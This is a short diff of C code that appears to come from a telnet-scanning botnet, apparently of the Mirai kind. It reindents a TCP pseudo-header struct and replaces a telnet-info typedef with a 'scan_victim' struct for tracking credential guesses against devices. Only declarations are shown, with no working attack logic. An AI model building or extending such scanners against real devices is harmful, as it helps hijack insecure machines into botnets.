@@ -24,25 +24,24 @@ static char *passwords[] =
 
 struct pseudo_header
 { //needed for checksum calculation
-    unsigned int   source_address;
-    unsigned int   dest_address;
-    unsigned char  placeholder;
-    unsigned char  protocol;
-    unsigned short tcp_length;
+	unsigned int   source_address;
+	unsigned int   dest_address;
+	unsigned char  placeholder;
+	unsigned char  protocol;
+	unsigned short tcp_length;
 
-    struct tcphdr tcp;
+	struct tcphdr tcp;
 };
 
-typedef struct _telnetinfo_t
+struct scan_victim
 {
-    ipv4_t ip;
-    // int type; // Maybe later
-    int  user;
-    int  pass;
-    char prompt[5]; // How the prompt looks to match it and collect data
-} telnetinfo_t;
+	ipv4_t ip;
+	uint8_t state;
+	int32_t sock;
+	int  user;
+	int  pass;
+	char prompt[5]; // How the prompt looks to match it and collect data
+};
 
 void scan_init();
 bool scan_scanner();
-void scan_handler(ipv4_t);
-bool scan_listen();
